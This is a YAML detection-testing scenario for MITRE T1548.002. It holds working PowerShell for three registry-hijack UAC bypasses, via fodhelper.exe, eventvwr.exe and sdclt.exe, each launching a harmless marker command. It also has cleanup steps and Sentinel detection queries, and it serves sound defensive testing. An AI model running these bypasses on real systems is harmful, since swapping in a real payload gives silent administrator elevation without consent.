id: T1548.002_bypass_uac
name: "Abuse Elevation Control Mechanism — Bypass User Account Control"
mitre_technique: "T1548.002"
mitre_tactic: "defense_evasion"
description: >
  Adversaries bypass Windows UAC to elevate from a medium-integrity process to
  high-integrity (administrator) without triggering a UAC prompt. Common techniques
  exploit auto-elevating binaries that trust a writable registry path (fodhelper.exe,
  eventvwr.exe, sdclt.exe) or COM object hijacks in the elevated context.
  This scenario exercises the three most common registry-hijack UAC bypass methods,
  each writing a benign command to the exploited key. Detection relies on monitoring
  auto-elevating binary execution, HKCU registry writes to hijacked paths, and
  unexpected high-integrity child process spawns.
  Note: Only effective when current user is in local Administrators group.
author: stanleytobias
created: "2026-01-01"
platform: windows
references:
  - https://attack.mitre.org/techniques/T1548/002/

steps:
  - step: 1
    type: marker
    description: "Pre-execution context"
    message: "Starting T1548.002 — UAC Bypass simulation (user must be in local Administrators group)"

  - step: 2
    type: exec_powershell
    description: "Method 1: fodhelper.exe HKCU shell open command hijack"
    command: |
      Write-Host "[PAS] UAC Bypass Method 1: fodhelper.exe registry hijack"
      $regPath = "HKCU:\Software\Classes\ms-settings\shell\open\command"
      New-Item -Path $regPath -Force | Out-Null
      Set-ItemProperty -Path $regPath -Name "(Default)" `
          -Value "cmd.exe /c echo PAS-T1548-FODHELPER > $env:TEMP\PAS_T1548_fodhelper.txt"
      Set-ItemProperty -Path $regPath -Name "DelegateExecute" -Value "" -Force

      Write-Host "[PAS] Registry hijack key written: $regPath"
      Write-Host "[PAS] Launching fodhelper.exe — should trigger registry-hijacked command"
      Start-Process "$env:SystemRoot\System32\fodhelper.exe" -WindowStyle Hidden
      Start-Sleep -Seconds 3

      if (Test-Path "$env:TEMP\PAS_T1548_fodhelper.txt") {
          Write-Host "[PAS] UAC BYPASS SUCCEEDED — elevated command ran without UAC prompt"
      } else {
          Write-Host "[PAS] Command did not execute (UAC bypass may be blocked or user not admin)"
      }

  - step: 3
    type: exec_powershell
    description: "Method 2: eventvwr.exe HKCU mscfile shell open command hijack"
    command: |
      Write-Host "[PAS] UAC Bypass Method 2: eventvwr.exe registry hijack"
      $regPath = "HKCU:\Software\Classes\mscfile\shell\open\command"
      New-Item -Path $regPath -Force | Out-Null
      Set-ItemProperty -Path $regPath -Name "(Default)" `
          -Value "cmd.exe /c echo PAS-T1548-EVENTVWR > $env:TEMP\PAS_T1548_eventvwr.txt"

      Write-Host "[PAS] Registry hijack key written: $regPath"
      Start-Process "$env:SystemRoot\System32\eventvwr.exe" -WindowStyle Hidden
      Start-Sleep -Seconds 3

      if (Test-Path "$env:TEMP\PAS_T1548_eventvwr.txt") {
          Write-Host "[PAS] UAC BYPASS SUCCEEDED via eventvwr"
      } else {
          Write-Host "[PAS] eventvwr method did not fire (expected if patched)"
      }

  - step: 4
    type: exec_powershell
    description: "Method 3: sdclt.exe /KickOffElev HKCU IsolatedCommand hijack"
    command: |
      Write-Host "[PAS] UAC Bypass Method 3: sdclt.exe /KickOffElev hijack"
      $regPath = "HKCU:\Software\Microsoft\Windows\CurrentVersion\App Paths\control.exe"
      New-Item -Path $regPath -Force | Out-Null
      Set-ItemProperty -Path $regPath -Name "(Default)" `
          -Value "cmd.exe /c echo PAS-T1548-SDCLT > $env:TEMP\PAS_T1548_sdclt.txt"

      Write-Host "[PAS] Registry hijack key written: $regPath"
      Start-Process "$env:SystemRoot\System32\sdclt.exe" -ArgumentList "/KickOffElev" -WindowStyle Hidden
      Start-Sleep -Seconds 3

      if (Test-Path "$env:TEMP\PAS_T1548_sdclt.txt") {
          Write-Host "[PAS] UAC BYPASS SUCCEEDED via sdclt"
      } else {
          Write-Host "[PAS] sdclt method did not fire (expected if patched)"
      }

  - step: 5
    type: sleep
    description: "Allow telemetry to flush"
    seconds: 5

  - step: 6
    type: marker
    description: "Post-execution prompt"
    message: "Check SIEM — HKCU registry writes to ms-settings/mscfile/App Paths and auto-elevating binary execution should be visible"

cleanup:
  - step: 1
    type: exec_powershell
    description: "Remove all UAC bypass registry keys"
    command: |
      $keys = @(
          "HKCU:\Software\Classes\ms-settings",
          "HKCU:\Software\Classes\mscfile",
          "HKCU:\Software\Microsoft\Windows\CurrentVersion\App Paths\control.exe"
      )
      foreach ($k in $keys) {
          if (Test-Path $k) {
              Remove-Item $k -Recurse -Force -ErrorAction SilentlyContinue
              Write-Host "[PAS][Cleanup] Removed: $k"
          }
      }

  - step: 2
    type: exec_powershell
    description: "Remove output marker files"
    command: |
      @("$env:TEMP\PAS_T1548_fodhelper.txt","$env:TEMP\PAS_T1548_eventvwr.txt",
        "$env:TEMP\PAS_T1548_sdclt.txt") |
          ForEach-Object { Remove-Item $_ -Force -ErrorAction SilentlyContinue }
      Write-Host "[PAS][Cleanup] Temp files removed"

  - step: 3
    type: marker
    description: "Cleanup complete"
    message: "T1548.002 cleanup complete — all bypass registry keys removed"

analyst_checklist:
  - "Registry event: HKCU write to Software\Classes\ms-settings\shell\open\command by non-system process"
  - "Registry event: HKCU write to Software\Classes\mscfile\shell\open\command"
  - "Process event: fodhelper.exe / eventvwr.exe / sdclt.exe spawned from powershell.exe or user context"
  - "Process event: cmd.exe spawned as high-integrity child of fodhelper.exe / eventvwr.exe"
  - "Sentinel: DeviceRegistryEvents | where RegistryKey contains 'ms-settings\\shell\\open\\command' and ActionType == 'RegistryValueSet'"
  - "Sentinel: DeviceProcessEvents | where FileName in ('fodhelper.exe','eventvwr.exe','sdclt.exe') and InitiatingProcessIntegrityLevel != 'High'"
  - "Sentinel: DeviceProcessEvents | where InitiatingProcessFileName == 'fodhelper.exe' and FileName == 'cmd.exe'"
  - "MDE alert: 'UAC bypass attempt' or 'Auto-elevating binary used for privilege escalation'"
  - "CONTROL CHECK: If bypass succeeded (output file created), your UAC bypass detection has a gap"
  - "CONTROL CHECK: UAC set to 'Always notify' mitigates auto-elevation hijacks — verify UAC level via registry: HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System\ConsentPromptBehaviorAdmin"
